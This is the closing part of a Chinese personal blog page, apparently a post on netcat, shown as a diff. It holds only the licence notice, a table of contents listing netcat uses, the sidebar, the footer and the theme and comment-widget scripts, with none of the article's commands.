+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+              <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"># 网络安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/virtualBox%E6%A1%A5%E6%8E%A5%E7%BD%91%E5%8D%A1%E6%9C%AA%E6%8C%87%E5%AE%9A/" rel="prev" title="解决 virtualBox 桥接网卡未指定问题">
+      <i class="fa fa-chevron-left"></i> 解决 virtualBox 桥接网卡未指定问题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/wireshark/" rel="next" title="wireshark">
+      wireshark <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录 | toc
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览 | overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-telnet-banner"><span class="nav-text">1. telnet &#x2F; banner</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">2. 传输文本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95"><span class="nav-text">3. 传输文件&#x2F;目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1"><span class="nav-text">4. 流媒体服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">5. 端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98"><span class="nav-text">6. 远程克隆硬盘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="nav-text">7. 远程控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-ncat"><span class="nav-text">8. ncat</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Charles"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Charles</p>
+  <div class="site-description" itemprop="description">慢下来，记录生活点滴，畅游人类知识和艺术的海洋。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cs-cshi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cs-cshi" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/572081809@qq.com" title="E-Mail → 572081809@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/dataStrutures/leetcode/" title="dataStrutures&#x2F;leetcode&#x2F;">leetcode 刷题</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/Virtualbox%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E8%AF%A6%E8%A7%A3/" title="Virtualbox虚拟机网络连接方式详解&#x2F;">Virtualbox虚拟机网络连接方式详解</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/cybersecurity/XCTF%E9%A2%98%E7%9B%AE/" title="cybersecurity&#x2F;XCTF题目&#x2F;">XCTF 攻防世界刷题</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/cybersecurity/Metasploit%20Framework/" title="cybersecurity&#x2F;Metasploit Framework&#x2F;">Metasploit Framework</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/pyshark%20%E8%A7%A3%E6%9E%90pcap%E8%8E%B7%E5%BE%97%20http%20header/" title="pyshark 解析pcap获得 http header&#x2F;">pyshark 解析 pcap 获取 http header</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Charles</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">236k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:35</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
+  <script>
+      window.addEventListener('load', () => {
+      quicklink({
+        timeout : 3000,
+        priority: true,
+        ignores : [uri => uri.includes('#'),uri => uri === 'https://cs-cshi.github.io/cybersecurity/netcat/',]
+      });
+      });
+  </script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'hbdf2zNhxCCzlSuodiOKirnE-gzGzoHsz',
+      appKey     : 'gJuRc9Mu4JIB0czCtRefSodC',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
